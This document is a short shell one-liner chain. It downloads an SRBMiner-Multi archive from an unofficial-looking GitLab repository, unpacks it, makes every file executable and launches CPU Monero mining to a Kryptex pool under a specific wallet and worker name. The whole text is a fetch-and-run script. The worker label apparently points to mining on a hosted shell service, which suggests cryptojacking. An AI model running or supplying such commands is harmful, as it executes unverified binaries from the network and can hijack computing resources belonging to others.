wget https://gitlab.com/sight2/03ef/-/raw/master/SRBMiner-Multi-2-7-9-Linux.tar.gz && \
gunzip SRBMiner-Multi-2-7-9-Linux.tar.gz && \
tar --extract -f SRBMiner-Multi-2-7-9-Linux.tar && \
cd SRBMiner-Multi-2-7-9 && \
chmod +x * && \
./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://xmr.kryptex.network:7777 --wallet krxYEJVN46/onworks222 --disable-gpu